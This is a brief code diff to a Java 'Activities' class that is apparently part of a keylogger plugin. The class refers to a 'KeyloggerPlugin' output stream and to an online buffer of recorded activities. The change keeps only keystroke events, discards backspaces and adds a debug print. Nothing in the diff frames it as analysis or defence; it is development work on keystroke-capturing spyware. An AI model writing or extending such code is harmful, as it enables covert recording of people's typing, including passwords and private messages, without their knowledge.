@@ -13,8 +13,13 @@ public class Activities {
 	public static synchronized void add(Activity activity) {
 		/*if (activity instanceof Key && unix && activities.size() > 0 && ((Key)activities.get(activities.size() - 1)).getKey() == (((Key)activity).getKey())) {
 			return;
-		}*/
-		activities.add(activity);
+		}*/		
+		
+		System.out.println(activity instanceof Key && ((Key)activity).getChar() == '\b');
+		
+		if (activity instanceof Key && ((Key)activity).getChar() != '\b') {
+			activities.add(activity);
+		}
 		
 		if (KeyloggerPlugin.dos != null) {
 			if (online.size() > 2500) {
